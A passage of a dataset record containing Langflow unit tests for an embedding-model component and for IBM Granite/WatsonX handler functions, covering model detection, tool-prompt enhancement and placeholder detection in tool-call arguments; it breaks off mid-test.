\\\"provider\\\": \\\"Unknown\\\",\\n                \\\"metadata\\\": {\\n                    \\\"embedding_class\\\": \\\"UnknownEmbeddingClass\\\",\\n                    \\\"param_mapping\\\": {},\\n                },\\n            }\\n        ]\\n\\n        with pytest.raises(ValueError, match=\\\"Unknown embedding class: UnknownEmbeddingClass\\\"):\\n            component.build_embeddings()\\n\\n    @patch(\\\"lfx.components.models_and_agents.embedding_model.get_embeddings\\\")\\n    def test_build_embeddings_google(self, mock_get_embeddings, component_class):\\n        \\\"\\\"\\\"Test that build_embeddings passes correct params for Google provider.\\\"\\\"\\\"\\n        mock_instance = MagicMock()\\n        mock_get_embeddings.return_value = mock_instance\\n\\n        component = component_class(\\n            model=[\\n                {\\n                    \\\"name\\\": \\\"models/text-embedding-004\\\",\\n                    \\\"provider\\\": \\\"Google Generative AI\\\",\\n                    \\\"metadata\\\": {\\n                        \\\"embedding_class\\\": \\\"GoogleGenerativeAIEmbeddings\\\",\\n                        \\\"param_mapping\\\": {\\n                            \\\"model\\\": \\\"model\\\",\\n                            \\\"api_key\\\": \\\"google_api_key\\\",\\n                            \\\"request_timeout\\\": \\\"request_options\\\",\\n                            \\\"model_kwargs\\\": \\\"client_options\\\",\\n                        },\\n                    },\\n                }\\n            ],\\n            api_key=\\\"test-google-key\\\",\\n        )\\n        component._user_id = \\\"test-user-id\\\"\\n        component.api_base = None\\n        component.dimensions = None\\n        component.chunk_size = None\\n        component.request_timeout = None\\n        component.max_retries = None\\n        component.show_progress_bar = None\\n        component.model_kwargs = None\\n\\n        result = component.build_embeddings()\\n\\n        # Verify get_embeddings was called with correct parameters\\n        mock_get_embeddings.assert_called_once()\\n        call_kwargs = mock_get_embeddings.call_args.kwargs\\n        assert call_kwargs[\\\"model\\\"][0][\\\"name\\\"] == \\\"models/text-embedding-004\\\"\\n        assert call_kwargs[\\\"model\\\"][0][\\\"provider\\\"] == \\\"Google Generative AI\\\"\\n        assert call_kwargs[\\\"api_key\\\"] == \\\"test-google-key\\\"\\n\\n        assert result == mock_instance\\n\\n    @patch(\\\"lfx.components.models_and_agents.embedding_model.get_embeddings\\\")\\n    def test_build_embeddings_passes_watsonx_params(self, mock_get_embeddings, component_class):\\n        \\\"\\\"\\\"Test that watsonx-specific params are forwarded to get_embeddings.\\\"\\\"\\\"\\n        mock_get_embeddings.return_value = MagicMock()\\n\\n        component = component_class(\\n            model=[\\n                {\\n                    \\\"name\\\": \\\"ibm/slate-125m-english-rtrvr\\\",\\n                    \\\"provider\\\": \\\"IBM WatsonX\\\",\\n                    \\\"metadata\\\": {\\n                        \\\"embedding_class\\\": \\\"WatsonxEmbeddings\\\",\\n                        \\\"param_mapping\\\": {\\n                            \\\"model_id\\\": \\\"model_id\\\",\\n                            \\\"api_key\\\": \\\"apikey\\\",\\n                            \\\"url\\\": \\\"url\\\",\\n                            \\\"project_id\\\": \\\"project_id\\\",\\n                        },\\n                    },\\n                }\\n            ],\\n            api_key=\\\"test-watsonx-key\\\",\\n        )\\n        component._user_id = \\\"test-user-id\\\"\\n        component.base_url_ibm_watsonx = \\\"https://us-south.ml.cloud.ibm.com\\\"\\n        component.project_id = \\\"my-project-id\\\"\\n        component.api_base = None\\n        component.dimensions = None\\n        component.chunk_size = None\\n        component.request_timeout = None\\n        component.max_retries = None\\n        component.show_progress_bar = None\\n        component.model_kwargs = None\\n\\n        component.build_embeddings()\\n\\n        call_kwargs = mock_get_embeddings.call_args.kwargs\\n        assert call_kwargs[\\\"watsonx_url\\\"] == \\\"https://us-south.ml.cloud.ibm.com\\\"\\n        assert call_kwargs[\\\"watsonx_project_id\\\"] == \\\"my-project-id\\\"\\n\\n    @patch(\\\"lfx.components.models_and_agents.embedding_model.get_embeddings\\\")\\n    def test_build_embeddings_passes_all_optional_params(self, mock_get_embeddings, component_class, default_kwargs):\\n        \\\"\\\"\\\"Test that all optional parameters are forwarded correctly.\\\"\\\"\\\"\\n        mock_get_embeddings.return_value = MagicMock()\\n\\n        component = component_class(**default_kwargs)\\n        component._user_id = \\\"test-user-id\\\"\\n        component.api_key = \\\"test-key\\\"\\n        component.api_base = \\\"https://custom.api.base\\\"\\n        component.dimensions = 512\\n        component.chunk_size = 500\\n        component.request_timeout = 30.0\\n        component.max_retries = 5\\n        component.show_progress_bar = True\\n        component.model_kwargs = {\\\"extra_param\\\": \\\"value\\\"}\\n\\n        component.build_embeddings()\\n\\n        call_kwargs = mock_get_embeddings.call_args.kwargs\\n        assert call_kwargs[\\\"api_base\\\"] == \\\"https://custom.api.base\\\"\\n        assert call_kwargs[\\\"dimensions\\\"] == 512\\n        assert call_kwargs[\\\"chunk_size\\\"] == 500\\n        assert call_kwargs[\\\"request_timeout\\\"] == 30.0\\n        assert call_kwargs[\\\"max_retries\\\"] == 5\\n        assert call_kwargs[\\\"show_progress_bar\\\"] is True\\n        assert call_kwargs[\\\"model_kwargs\\\"] == {\\\"extra_param\\\": \\\"value\\\"}\\n\"},{\"record_type\":\"third_party_source_reference\",\"source_repository\":\"langflow-main\",\"source_path\":\"src/backend/tests/unit/components/models_and_agents/test_ibm_granite_handler.py\",\"source_license\":\"MIT\",\"trust\":\"untrusted_reference_only\",\"retrieval_policy\":\"internal_reference_only\",\"source_sha256\":\"4a0f8a89ca1d0cae91c07c58a02b2f62c0b66283ddff828eca540519b9c7ac4a\",\"content\":\"\\\"\\\"\\\"Tests for IBM Granite handler functions.\\n\\nThis module tests the specialized handling for IBM Granite models\\nwhich have different tool calling behavior compared to other LLMs.\\n\\\"\\\"\\\"\\n\\nimport contextlib\\nfrom unittest.mock import Mock, patch\\n\\nimport pytest\\nfrom langchain_core.messages import AIMessage\\nfrom langchain_openai import ChatOpenAI\\nfrom lfx.components.langchain_utilities.ibm_granite_handler import (\\n    PLACEHOLDER_PATTERN,\\n    create_granite_agent,\\n    detect_placeholder_in_args,\\n    get_enhanced_system_prompt,\\n    is_granite_model,\\n    is_watsonx_model,\\n)\\n\\n# =============================================================================\\n# Tests for is_watsonx_model function\\n# =============================================================================\\n\\n\\ndef create_mock_tool(tool_name: str) -> Mock:\\n    \\\"\\\"\\\"Create a mock tool with proper name attribute.\\\"\\\"\\\"\\n    mock = Mock()\\n    mock.name = tool_name\\n    return mock\\n\\n\\nclass TestIsWatsonxModel:\\n    \\\"\\\"\\\"Test suite for is_watsonx_model function.\\\"\\\"\\\"\\n\\n    def test_detects_chatwatsonx_class(self):\\n        \\\"\\\"\\\"Test detection of ChatWatsonx class by name.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.__class__.__name__ = \\\"ChatWatsonx\\\"\\n\\n        result = is_watsonx_model(mock_llm)\\n\\n        assert result is True\\n\\n    def test_detects_watsonx_in_class_name(self):\\n        \\\"\\\"\\\"Test detection when class name contains 'watsonx'.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.__class__.__name__ = \\\"WatsonxLLM\\\"\\n\\n        result = is_watsonx_model(mock_llm)\\n\\n        assert result is True\\n\\n    def test_detects_by_module_langchain_ibm(self):\\n        \\\"\\\"\\\"Test detection by langchain_ibm module.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.__class__.__name__ = \\\"SomeModel\\\"\\n        mock_llm.__class__.__module__ = \\\"langchain_ibm.chat\\\"\\n\\n        result = is_watsonx_model(mock_llm)\\n\\n        assert result is True\\n\\n    def test_detects_by_module_watsonx(self):\\n        \\\"\\\"\\\"Test detection by watsonx in module name.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.__class__.__name__ = \\\"SomeModel\\\"\\n        mock_llm.__class__.__module__ = \\\"some.watsonx.module\\\"\\n\\n        result = is_watsonx_model(mock_llm)\\n\\n        assert result is True\\n\\n    def test_returns_false_for_openai(self):\\n        \\\"\\\"\\\"Test returns False for OpenAI models.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.__class__.__name__ = \\\"ChatOpenAI\\\"\\n        mock_llm.__class__.__module__ = \\\"langchain_openai.chat_models\\\"\\n\\n        result = is_watsonx_model(mock_llm)\\n\\n        assert result is False\\n\\n    def test_returns_false_for_anthropic(self):\\n        \\\"\\\"\\\"Test returns False for Anthropic models.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.__class__.__name__ = \\\"ChatAnthropic\\\"\\n        mock_llm.__class__.__module__ = \\\"langchain_anthropic\\\"\\n\\n        result = is_watsonx_model(mock_llm)\\n\\n        assert result is False\\n\\n    def test_case_insensitive_class_name(self):\\n        \\\"\\\"\\\"Test case insensitive detection for class name.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.__class__.__name__ = \\\"CHATWATSONX\\\"\\n\\n        result = is_watsonx_model(mock_llm)\\n\\n        assert result is True\\n\\n    def test_case_insensitive_module_name(self):\\n        \\\"\\\"\\\"Test case insensitive detection for module name.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.__class__.__name__ = \\\"SomeModel\\\"\\n        mock_llm.__class__.__module__ = \\\"LANGCHAIN_IBM.chat\\\"\\n\\n        result = is_watsonx_model(mock_llm)\\n\\n        assert result is True\\n\\n    def test_works_with_real_mock_structure(self):\\n        \\\"\\\"\\\"Test with a more realistic mock structure.\\\"\\\"\\\"\\n\\n        # Simulate what a real ChatWatsonx instance would look like\\n        class FakeChatWatsonx:\\n            pass\\n\\n        mock_llm = FakeChatWatsonx()\\n\\n        result = is_watsonx_model(mock_llm)\\n\\n        assert result is True\\n\\n    def test_detects_llama_on_watsonx(self):\\n        \\\"\\\"\\\"Test detection of Llama model running on WatsonX.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.__class__.__name__ = \\\"ChatWatsonx\\\"\\n        mock_llm.model_id = \\\"meta-llama/llama-3-2-11b-vision\\\"\\n\\n        result = is_watsonx_model(mock_llm)\\n\\n        assert result is True\\n\\n    def test_detects_mistral_on_watsonx(self):\\n        \\\"\\\"\\\"Test detection of Mistral model running on WatsonX.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.__class__.__name__ = \\\"ChatWatsonx\\\"\\n        mock_llm.model_id = \\\"mistralai/mistral-large\\\"\\n\\n        result = is_watsonx_model(mock_llm)\\n\\n        assert result is True\\n\\n    @pytest.mark.parametrize(\\\"model_name\\\", [\\\"watsonx/granite-3-3-8b-instruct\\\", \\\"WATSONX/granite-3-3-8b-instruct\\\"])\\n    def test_detects_watsonx_prefix_on_openai_compatible_client(self, model_name):\\n        \\\"\\\"\\\"Test detection when LiteLLM routes WatsonX through ChatOpenAI.\\\"\\\"\\\"\\n        llm = ChatOpenAI(api_key=\\\"test\\\", base_url=\\\"https://proxy.example/v1\\\", model=model_name)\\n\\n        result = is_watsonx_model(llm)\\n\\n        assert result is True\\n\\n\\n# =============================================================================\\n# Tests for is_granite_model function (deprecated but kept for compatibility)\\n# =============================================================================\\n\\n\\nclass TestIsGraniteModel:\\n    \\\"\\\"\\\"Test suite for is_granite_model function.\\\"\\\"\\\"\\n\\n    def test_is_granite_model_with_model_id_granite(self):\\n        \\\"\\\"\\\"Test detection when model_id contains 'granite'.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.model_id = \\\"ibm/granite-13b-chat-v2\\\"\\n\\n        result = is_granite_model(mock_llm)\\n\\n        assert result is True\\n\\n    def test_is_granite_model_with_model_name_granite(self):\\n        \\\"\\\"\\\"Test detection when model_name contains 'granite'.\\\"\\\"\\\"\\n        mock_llm = Mock(spec=[\\\"model_name\\\"])\\n        mock_llm.model_name = \\\"granite-3.1-8b-instruct\\\"\\n\\n        result = is_granite_model(mock_llm)\\n\\n        assert result is True\\n\\n    def test_is_granite_model_case_insensitive(self):\\n        \\\"\\\"\\\"Test that detection is case insensitive.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.model_id = \\\"IBM/GRANITE-13B-CHAT\\\"\\n\\n        result = is_granite_model(mock_llm)\\n\\n        assert result is True\\n\\n    def test_is_granite_model_mixed_case(self):\\n        \\\"\\\"\\\"Test detection with mixed case.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.model_id = \\\"ibm/GrAnItE-model\\\"\\n\\n        result = is_granite_model(mock_llm)\\n\\n        assert result is True\\n\\n    def test_is_granite_model_not_granite(self):\\n        \\\"\\\"\\\"Test returns False for non-Granite models.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.model_id = \\\"meta-llama/llama-3-70b-instruct\\\"\\n\\n        result = is_granite_model(mock_llm)\\n\\n        assert result is False\\n\\n    def test_is_granite_model_openai(self):\\n        \\\"\\\"\\\"Test returns False for OpenAI models.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.model_id = \\\"gpt-4\\\"\\n        mock_llm.model_name = \\\"gpt-4-turbo\\\"\\n\\n        result = is_granite_model(mock_llm)\\n\\n        assert result is False\\n\\n    def test_is_granite_model_empty_model_id(self):\\n        \\\"\\\"\\\"Test with empty model_id.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.model_id = \\\"\\\"\\n        mock_llm.model_name = \\\"\\\"\\n\\n        result = is_granite_model(mock_llm)\\n\\n        assert result is False\\n\\n    def test_is_granite_model_none_model_id(self):\\n        \\\"\\\"\\\"Test with None model_id.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.model_id = None\\n        mock_llm.model_name = None\\n\\n        result = is_granite_model(mock_llm)\\n\\n        assert result is False\\n\\n    def test_is_granite_model_no_attributes(self):\\n        \\\"\\\"\\\"Test with model that has neither model_id nor model_name.\\\"\\\"\\\"\\n        mock_llm = Mock(spec=[])  # No attributes\\n\\n        result = is_granite_model(mock_llm)\\n\\n        assert result is False\\n\\n    def test_is_granite_model_fallback_to_model_name(self):\\n        \\\"\\\"\\\"Test fallback to model_name when model_id is not available.\\\"\\\"\\\"\\n        mock_llm = Mock(spec=[\\\"model_name\\\"])\\n        mock_llm.model_name = \\\"granite-3b\\\"\\n\\n        result = is_granite_model(mock_llm)\\n\\n        assert result is True\\n\\n    def test_is_granite_model_partial_match(self):\\n        \\\"\\\"\\\"Test that partial match works (granite anywhere in string).\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.model_id = \\\"some-prefix-granite-suffix\\\"\\n\\n        result = is_granite_model(mock_llm)\\n\\n        assert result is True\\n\\n\\n# =============================================================================\\n# Tests for get_enhanced_system_prompt function\\n# =============================================================================\\n\\n\\nclass TestGetEnhancedSystemPrompt:\\n    \\\"\\\"\\\"Test suite for get_enhanced_system_prompt function.\\\"\\\"\\\"\\n\\n    def test_enhances_prompt_with_multiple_tools(self):\\n        \\\"\\\"\\\"Test that prompt is enhanced when multiple tools are provided.\\\"\\\"\\\"\\n        base_prompt = \\\"You are a helpful assistant.\\\"\\n        mock_tools = [\\n            create_mock_tool(\\\"search_tool\\\"),\\n            create_mock_tool(\\\"calculator_tool\\\"),\\n            create_mock_tool(\\\"date_tool\\\"),\\n        ]\\n\\n        result = get_enhanced_system_prompt(base_prompt, mock_tools)\\n\\n        assert base_prompt in result\\n        assert \\\"TOOL USAGE GUIDELINES\\\" in result\\n        assert \\\"search_tool\\\" in result\\n        assert \\\"calculator_tool\\\" in result\\n        assert \\\"date_tool\\\" in result\\n\\n    def test_no_enhancement_with_empty_tools(self):\\n        \\\"\\\"\\\"Test that prompt is not enhanced when tools list is empty.\\\"\\\"\\\"\\n        base_prompt = \\\"You are a helpful assistant.\\\"\\n\\n        result = get_enhanced_system_prompt(base_prompt, [])\\n\\n        assert result == base_prompt\\n\\n    def test_no_enhancement_with_none_tools(self):\\n        \\\"\\\"\\\"Test that prompt is not enhanced when tools is None.\\\"\\\"\\\"\\n        base_prompt = \\\"You are a helpful assistant.\\\"\\n\\n        result = get_enhanced_system_prompt(base_prompt, None)\\n\\n        assert result == base_prompt\\n\\n    def test_no_enhancement_with_single_tool(self):\\n        \\\"\\\"\\\"Test that prompt is not enhanced with only one tool.\\\"\\\"\\\"\\n        base_prompt = \\\"You are a helpful assistant.\\\"\\n        mock_tools = [create_mock_tool(\\\"single_tool\\\")]\\n\\n        result = get_enhanced_system_prompt(base_prompt, mock_tools)\\n\\n        assert result == base_prompt\\n\\n    def test_enhancement_with_two_tools(self):\\n        \\\"\\\"\\\"Test that prompt is enhanced with exactly two tools.\\\"\\\"\\\"\\n        base_prompt = \\\"You are a helpful assistant.\\\"\\n        mock_tools = [create_mock_tool(\\\"tool1\\\"), create_mock_tool(\\\"tool2\\\")]\\n\\n        result = get_enhanced_system_prompt(base_prompt, mock_tools)\\n\\n        assert \\\"TOOL USAGE GUIDELINES\\\" in result\\n\\n    def test_empty_base_prompt(self):\\n        \\\"\\\"\\\"Test with empty base prompt.\\\"\\\"\\\"\\n        mock_tools = [create_mock_tool(\\\"tool1\\\"), create_mock_tool(\\\"tool2\\\")]\\n\\n        result = get_enhanced_system_prompt(\\\"\\\", mock_tools)\\n\\n        assert \\\"TOOL USAGE GUIDELINES\\\" in result\\n\\n    def test_enhancement_contains_key_instructions(self):\\n        \\\"\\\"\\\"Test that enhancement contains all key instructions.\\\"\\\"\\\"\\n        base_prompt = \\\"Base prompt\\\"\\n        mock_tools = [create_mock_tool(\\\"tool1\\\"), create_mock_tool(\\\"tool2\\\")]\\n\\n        result = get_enhanced_system_prompt(base_prompt, mock_tools)\\n\\n        assert \\\"ALWAYS call tools\\\" in result\\n        assert \\\"one tool at a time\\\" in result\\n        assert \\\"placeholder syntax\\\" in result\\n        assert \\\"AVAILABLE TOOLS\\\" in result\\n\\n    def test_tool_names_listed(self):\\n        \\\"\\\"\\\"Test that all tool names are listed in the enhancement.\\\"\\\"\\\"\\n        mock_tools = [\\n            create_mock_tool(\\\"perform_search\\\"),\\n            create_mock_tool(\\\"get_current_date\\\"),\\n            create_mock_tool(\\\"evaluate_expression\\\"),\\n        ]\\n\\n        result = get_enhanced_system_prompt(\\\"Base\\\", mock_tools)\\n\\n        assert \\\"perform_search\\\" in result\\n        assert \\\"get_current_date\\\" in result\\n        assert \\\"evaluate_expression\\\" in result\\n\\n\\n# =============================================================================\\n# Tests for detect_placeholder_in_args function\\n# =============================================================================\\n\\n\\nclass TestDetectPlaceholderInArgs:\\n    \\\"\\\"\\\"Test suite for detect_placeholder_in_args function.\\\"\\\"\\\"\\n\\n    def test_detects_result_from_placeholder(self):\\n        \\\"\\\"\\\"Test detection of <result-from-...> placeholder.\\\"\\\"\\\"\\n        tool_calls = [{\\\"name\\\": \\\"calculator\\\", \\\"args\\\": {\\\"expression\\\": \\\"<result-from-search>\\\"}}]\\n\\n        has_placeholder, value = detect_placeholder_in_args(tool_calls)\\n\\n        assert has_placeholder is True\\n        assert value == \\\"<result-from-search>\\\"\\n\\n    def test_detects_extracted_date_placeholder(self):\\n        \\\"\\\"\\\"Test detection of <extracted_date> placeholder.\\\"\\\"\\\"\\n        tool_calls = [{\\\"name\\\": \\\"calculator\\\", \\\"args\\\": {\\\"expression\\\": \\\"<extracted_date>-18\\\"}}]\\n\\n        has_placeholder, value = detect_placeholder_in_args(tool_calls)\\n\\n        assert has_placeholder is True\\n        assert \\\"<extracted_date>\\\" in value\\n\\n    def test_detects_previous_value_placeholder(self):\\n        \\\"\\\"\\\"Test detection of <previous-value> placeholder.\\\"\\\"\\\"\\n        tool_calls = [{\\\"name\\\": \\\"tool\\\", \\\"args\\\": {\\\"input\\\": \\\"<previous-value>\\\"}}]\\n\\n        has_placeholder, _ = detect_placeholder_in_args(tool_calls)\\n\\n        assert has_placeholder is True\\n\\n    def test_detects_output_placeholder(self):\\n        \\\"\\\"\\\"Test detection of <output-...> placeholder.\\\"\\\"\\\"\\n        tool_calls = [{\\\"name\\\": \\\"tool\\\", \\\"args\\\": {\\\"data\\\": \\\"<output-from-api>\\\"}}]\\n\\n        has_placeholder, _ = detect_placeholder_in_args(tool_calls)\\n\\n        assert has_placeholder is True\\n\\n    def test_detects_response_placeholder(self):\\n        \\\"\\\"\\\"Test detection of <response-...> placeholder.\\\"\\\"\\\"\\n        tool_calls = [{\\\"name\\\": \\\"tool\\\", \\\"args\\\": {\\\"value\\\": \\\"<response-data>\\\"}}]\\n\\n        has_placeholder, _ = detect_placeholder_in_args(tool_calls)\\n\\n        assert has_placeholder is True\\n\\n    def test_detects_current_placeholder(self):\\n        \\\"\\\"\\\"Test detection of <current-...> placeholder.\\\"\\\"\\\"\\n        tool_calls = [{\\\"name\\\": \\\"tool\\\", \\\"args\\\": {\\\"date\\\": \\\"<current-date>\\\"}}]\\n\\n        has_placeholder, _ = detect_placeholder_in_args(tool_calls)\\n\\n        assert has_placeholder is True\\n\\n    def test_detects_search_result_placeholder(self):\\n        \\\"\\\"\\\"Test detection of <search-result> placeholder.\\\"\\\"\\\"\\n        tool_calls = [{\\\"name\\\": \\\"tool\\\", \\\"args\\\": {\\\"query\\\": \\\"<search-result>\\\"}}]\\n\\n        has_placeholder, _ = detect_placeholder_in_args(tool_calls)\\n\\n        assert has_placeholder is True\\n\\n    def test_detects_tool_result_placeholder(self):\\n        \\\"\\\"\\\"Test detection of <tool-output> placeholder.\\\"\\\"\\\"\\n        tool_calls = [{\\\"name\\\": \\\"tool\\\", \\\"args\\\": {\\\"input\\\": \\\"<tool-output>\\\"}}]\\n\\n        has_placeholder, _ = detect_placeholder_in_args(tool_calls)\\n\\n        assert has_placeholder is True\\n\\n    def test_no_placeholder_returns_false(self):\\n        \\\"\\\"\\\"Test returns False when no placeholder is present.\\\"\\\"\\\"\\n        tool_calls = [{\\\"name\\\": \\\"calculator\\\", \\\"args\\\": {\\\"expression\\\": \\\"2 + 2\\\"}}]\\n\\n        has_placeholder, value = detect_placeholder_in_args(tool_calls)\\n\\n        assert has_placeholder is False\\n        assert value is None\\n\\n    def test_empty_tool_calls(self):\\n        \\\"\\\"\\\"Test with empty tool_calls list.\\\"\\\"\\\"\\n        has_placeholder, value = detect_placeholder_in_args([])\\n\\n        assert has_placeholder is False\\n        assert value is None\\n\\n    def test_none_tool_calls(self):\\n        \\\"\\\"\\\"Test with None tool_calls.\\\"\\\"\\\"\\n        has_placeholder, value = detect_placeholder_in_args(None)\\n\\n        assert has_placeholder is False\\n        assert value is None\\n\\n    def test_args_as_string(self):\\n        \\\"\\\"\\\"Test detection when args is a string instead of dict.\\\"\\\"\\\"\\n        tool_calls = [{\\\"name\\\": \\\"tool\\\", \\\"args\\\": \\\"<result-from-previous>\\\"}]\\n\\n        has_placeholder, _ = detect_placeholder_in_args(tool_calls)\\n\\n        assert has_placeholder is True\\n\\n    def test_multiple_tool_calls_first_has_placeholder(self):\\n        \\\"\\\"\\\"Test with multiple tool calls where first has placeholder.\\\"\\\"\\\"\\n        tool_calls = [\\n            {\\\"name\\\": \\\"tool1\\\", \\\"args\\\": {\\\"value\\\": \\\"<result-from-api>\\\"}},\\n            {\\\"name\\\": \\\"tool2\\\", \\\"args\\\": {\\\"value\\\": \\\"normal\\\"}},\\n        ]\\n\\n        has_placeholder, _ = detect_placeholder_in_args(tool_calls)\\n\\n        assert has_placeholder is True\\n\\n    def test_multiple_tool_calls_second_has_placeholder(self):\\n        \\\"\\\"\\\"Test with multiple tool calls where second has placeholder.\\\"\\\"\\\"\\n        tool_calls = [\\n            {\\\"name\\\": \\\"tool1\\\", \\\"args\\\": {\\\"value\\\": \\\"normal\\\"}},\\n            {\\\"name\\\": \\\"tool2\\\", \\\"args\\\": {\\\"value\\\": \\\"<result-placeholder>\\\"}},\\n        ]\\n\\n        has_placeholder, _ = detect_placeholder_in_args(tool_calls)\\n\\n        assert has_placeholder is True\\n\\n    def test_nested_args_with_placeholder(self):\\n        \\\"\\\"\\\"Test with nested args structure.\\\"\\\"\\\"\\n        tool_calls = [{\\\"name\\\": \\\"tool\\\", \\\"args\\\": {\\\"outer\\\": {\\\"inner\\\": \\\"<result>\\\"}}}]\\n\\n        # Note: Current implementation only checks top-level values\\n        has_placeholder, _ = detect_placeholder_in_args(tool_calls)\\n\\n        # Should not detect nested placeholders with current implementation\\n        assert has_placeholder is False\\n\\n    def test_case_insensitive_detection(self):\\n        \\\"\\\"\\\"Test that detection is case insensitive.\\\"\\\"\\\"\\n        tool_calls = [{\\\"name\\\": \\\"tool\\\", \\\"args\\\": {\\\"value\\\": \\\"<RESULT-FROM-API>\\\"}}]\\n\\n        has_placeholder, _ = detect_placeholder_in_args(tool_calls)\\n\\n        assert has_placeholder is True\\n\\n    def test_tool_call_without_name(self):\\n        \\\"\\\"\\\"Test tool call without name field.\\\"\\\"\\\"\\n        tool_calls = [{\\\"args\\\": {\\\"value\\\": \\\"<result>\\\"}}]\\n\\n        has_placeholder, _ = detect_placeholder_in_args(tool_calls)\\n\\n        assert has_placeholder is True\\n\\n    def test_tool_call_without_args(self):\\n        \\\"\\\"\\\"Test tool call without args field.\\\"\\\"\\\"\\n        tool_calls = [{\\\"name\\\": \\\"tool\\\"}]\\n\\n        has_placeholder, _ = detect_placeholder_in_args(tool_calls)\\n\\n        assert has_placeholder is False\\n\\n    def test_normal_angle_brackets_not_detected(self):\\n        \\\"\\\"\\\"Test that normal angle brackets in code are not detected.\\\"\\\"\\\"\\n        tool_calls = [{\\\"name\\\": \\\"tool\\\", \\\"args\\\": {\\\"code\\\": \\\"if x < 10 and y > 5:\\\"}}]\\n\\n        has_placeholder, _ = detect_placeholder_in_args(tool_calls)\\n\\n        assert has_placeholder is False\\n\\n    def test_html_tags_not_detected(self):\\n        \\\"\\\"\\\"Test that HTML tags are not detected as placeholders.\\\"\\\"\\\"\\n        tool_calls = [{\\\"name\\\": \\\"tool\\\", \\\"args\\\": {\\\"html\\\": \\\"<div>content</div>\\\"}}]\\n\\n        has_placeholder, _ = detect_placeholder_in_args(tool_calls)\\n\\n        assert has_placeholder is False\\n\\n\\n# =============================================================================\\n# Tests for PLACEHOLDER_PATTERN regex\\n# =============================================================================\\n\\n\\nclass TestPlaceholderPattern:\\n    \\\"\\\"\\\"Test suite for PLACEHOLDER_PATTERN regex.\\\"\\\"\\\"\\n\\n    @pytest.mark.parametrize(\\n        (\\\"test_input\\\", \\\"expected\\\"),\\n        [\\n            # Should match\\n            (\\\"<result-from-search>\\\", True),\\n            (\\\"<value-extracted>\\\", True),\\n            (\\\"<output-data>\\\", True),\\n            (\\\"<response-from-api>\\\", True),\\n            (\\\"<data-field>\\\", True),\\n            (\\\"<from-previous-step>\\\", True),\\n            (\\\"<extract-this>\\\", True),\\n            (\\\"<previous-result>\\\", True),\\n            (\\\"<current-date>\\\", True),\\n            (\\\"<date-value>\\\", True),\\n            (\\\"<input-from-user>\\\", True),\\n            (\\\"<query-result>\\\", True),\\n            (\\\"<search-output>\\\", True),\\n            (\\\"<tool-output>\\\", True),\\n            (\\\"<RESULT-FROM-API>\\\", True),  # Case insensitive\\n            (\\\"<Result-Value>\\\", True),  # Mixed case\\n            # Should not match\\n            (\\\"<div>\\\", False),\\n            (\\\"<span>\\\", False),\\n            (\\\"<button>\\\", False),\\n            (\\\"<html>\\\", False),\\n            (\\\"<p>\\\", False),\\n            (\\\"<a>\\\", False),\\n            (\\\"< >\\\", False),\\n            (\\\"<>\\\", False),\\n            (\\\"<123>\\\", False),\\n            (\\\"<abc>\\\", False),  # No keywords\\n            (\\\"normal text\\\", False),\\n            (\\\"\\\", False),\\n        ],\\n    )\\n    def test_placeholder_pattern_matching(self, test_input, expected):\\n        \\\"\\\"\\\"Test PLACEHOLDER_PATTERN matches expected patterns.\\\"\\\"\\\"\\n        result = bool(PLACEHOLDER_PATTERN.search(test_input))\\n        assert result == expected, f\\\"Pattern '{test_input}' should {'match' if expected else 'not match'}\\\"\\n\\n    def test_pattern_extracts_full_placeholder(self):\\n        \\\"\\\"\\\"Test that pattern extracts the full placeholder.\\\"\\\"\\\"\\n        text = \\\"Calculate <result-from-search> minus 5\\\"\\n        match = PLACEHOLDER_PATTERN.search(text)\\n\\n        assert match is not None\\n        assert match.group() == \\\"<result-from-search>\\\"\\n\\n    def test_pattern_finds_multiple_placeholders(self):\\n        \\\"\\\"\\\"Test pattern can find multiple placeholders.\\\"\\\"\\\"\\n        text = \\\"Use <result-from-a> and <output-from-b>\\\"\\n        matches = PLACEHOLDER_PATTERN.findall(text)\\n\\n        assert len(matches) == 2\\n\\n\\n# =============================================================================\\n# Tests for create_granite_agent function\\n# =============================================================================\\n\\n\\nclass TestCreateGraniteAgent:\\n    \\\"\\\"\\\"Test suite for create_granite_agent function.\\\"\\\"\\\"\\n\\n    def test_raises_error_without_bind_tools(self):\\n        \\\"\\\"\\\"Test that ValueError is raised when LLM lacks bind_tools.\\\"\\\"\\\"\\n        mock_llm = Mock(spec=[])  # No bind_tools method\\n        mock_tools = [Mock(name=\\\"tool1\\\")]\\n        mock_prompt = Mock()\\n\\n        with pytest.raises(ValueError, match=\\\"bind_tools\\\"):\\n            create_granite_agent(mock_llm, mock_tools, mock_prompt)\\n\\n    def test_creates_agent_with_valid_inputs(self):\\n        \\\"\\\"\\\"Test agent creation with valid inputs.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.bind_tools = Mock(return_value=mock_llm)\\n        mock_tools = [Mock(name=\\\"tool1\\\")]\\n        mock_prompt = Mock()\\n        mock_prompt.invoke = Mock(return_value=Mock(messages=[]))\\n\\n        agent = create_granite_agent(mock_llm, mock_tools, mock_prompt)\\n\\n        assert agent is not None\\n        # Verify bind_tools was called with both tool_choice options\\n        assert mock_llm.bind_tools.call_count == 2\\n\\n    def test_bind_tools_called_with_required(self):\\n        \\\"\\\"\\\"Test that bind_tools is called with tool_choice='required'.\\\"\\\"\\\"\\n        mock_llm = Mock()\\n        mock_llm.bind_tools = Mock(return_value=mock_llm)\\n        mock_tools = 